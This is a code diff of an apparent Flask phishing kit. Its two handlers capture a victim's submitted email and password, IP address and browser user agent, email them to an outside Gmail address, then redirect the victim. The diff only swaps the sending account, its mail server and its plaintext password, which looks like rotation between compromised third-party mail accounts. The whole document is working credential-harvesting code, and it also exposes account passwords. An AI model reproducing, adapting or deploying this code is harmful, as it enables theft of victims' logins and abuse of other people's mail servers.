@@ -145,10 +145,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "Info@safinglass.com"
-        sender_emaill = "Info"
+        sender_email = "Baba@akerberg.fi"
+        sender_emaill = "Baba"
         receiver_email = "lukeangus1989@gmail.com"
-        password = "Safin@5253"
+        password = "Bams1705!"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "Ram stok !"
@@ -164,7 +164,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.safinglass.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.akerberg.fi", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -183,10 +183,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "Info@safinglass.com"
-        sender_emaill = "Info"
+        sender_email = "Baba@akerberg.fi"
+        sender_emaill = "Baba"
         receiver_email = "lukeangus1989@gmail.com"
-        password = "Safin@5253"
+        password = "Bams1705!"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "Ram stok !! "
@@ -202,7 +202,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.safinglass.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.akerberg.fi", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
